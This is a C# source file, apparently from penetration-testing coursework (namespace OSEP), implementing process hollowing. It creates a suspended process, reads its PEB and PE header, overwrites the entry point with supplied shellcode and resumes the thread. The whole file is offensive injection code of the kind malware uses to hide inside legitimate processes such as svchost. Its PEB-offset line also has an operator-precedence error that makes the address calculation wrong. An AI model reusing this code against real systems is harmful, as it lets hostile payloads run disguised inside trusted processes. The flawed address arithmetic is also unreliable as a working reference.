using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using static OSEP.Entry;

namespace OSEP
{
    public partial class CreateHollowProcess
    {
        private string _procPath;
        private byte[] _shellcode;

        public CreateHollowProcess(string process, byte[] shellcode)
        {
            _procPath = process;
            _shellcode = shellcode;
        }

        public void StartProcess()
        {
            //Instantiate required structures.
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
    
            //Create a suspended target process
            bool res = CreateProcess(null, _procPath, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            //Get the target process info.
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            
            //Get base address of the target process.
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + IntPtr.Size == 8 ? 0x10 : 0x08);

            //Read in some bytes from the target process so that we can parse the header.
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);


            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);



            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

            uint opthdr = e_lfanew_offset + 0x28;

            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);




            WriteProcessMemory(hProcess, addressOfEntryPoint, _shellcode, _shellcode.Length, out nRead);



            ResumeThread(pi.hThread);


        }
    }
}
